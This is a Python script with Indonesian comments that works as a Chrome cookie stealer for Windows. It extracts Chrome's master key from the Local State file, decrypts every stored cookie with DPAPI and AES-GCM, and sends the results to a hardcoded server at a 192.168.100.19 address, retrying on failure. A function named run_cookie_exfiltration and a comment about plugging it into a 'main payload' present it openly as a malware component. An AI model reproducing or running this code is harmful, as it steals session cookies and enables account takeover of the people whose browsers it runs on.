import os
import base64
import json
import shutil
import sqlite3
import win32crypt
import requests
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import time

SERVER_URL = "http://192.168.100.19:8080/report"

# Path Chrome Cookie dan Local State
CHROME_PROFILE_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")
COOKIE_DB = os.path.join(CHROME_PROFILE_PATH, "Cookies")
LOCAL_STATE_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")

# Fungsi bantu decrypt

def get_master_key():
    with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # strip DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_cookie(encrypted_value, master_key):
    try:
        if encrypted_value[:3] == b'v10':
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]  # remove GCM tag
            return decrypted.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[Decrypt Error] {str(e)}"

def get_chrome_cookies(domain_filter=None):
    try:
        temp_cookie_path = os.path.join(os.getenv("TEMP"), "temp_chrome_cookies")
        shutil.copy2(COOKIE_DB, temp_cookie_path)
        db = sqlite3.connect(temp_cookie_path)
        cursor = db.cursor()

        if domain_filter:
            cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies WHERE host_key LIKE ?", (f"%{domain_filter}%",))
        else:
            cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")

        master_key = get_master_key()
        cookies = []

        for host, name, encrypted_value, expires in cursor.fetchall():
            decrypted_value = decrypt_cookie(encrypted_value, master_key)
            expiry = convert_chrome_time(expires)
            cookies.append({
                "domain": host,
                "name": name,
                "value": decrypted_value,
                "expires": expiry
            })

        db.close()
        os.remove(temp_cookie_path)
        return cookies

    except Exception as e:
        return [{"error": str(e)}]

def convert_chrome_time(chrome_time):
    try:
        if chrome_time == 0:
            return "N/A"
        epoch_start = datetime(1601, 1, 1)
        return (epoch_start + timedelta(microseconds=chrome_time)).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "Invalid"

# Fungsi pengiriman dengan retry

def send_data_with_retry(url, payload, max_retries=3, delay=2):
    for attempt in range(1, max_retries + 1):
        try:
            resp = requests.post(url, json=payload, timeout=5)
            if resp.status_code == 200:
                print(f"[✓] Data berhasil dikirim ke {url} pada percobaan ke-{attempt}")
                return True
            else:
                print(f"[!] Server merespons {resp.status_code}, coba ulang...")
        except Exception as e:
            print(f"[!] Gagal koneksi ke {url}: {e}")
        time.sleep(delay)
    print(f"[✗] Gagal mengirim data ke {url} setelah {max_retries} percobaan.")
    return False

# Eksekusi mandiri atau integrasi ke payload utama
if __name__ == "__main__":
    result = get_chrome_cookies()
    send_data_with_retry(SERVER_URL, {"cookies": result})

# Fungsi untuk integrasi

def run_cookie_exfiltration():
    cookies = get_chrome_cookies()
    send_data_with_retry(SERVER_URL, {"cookies": cookies})
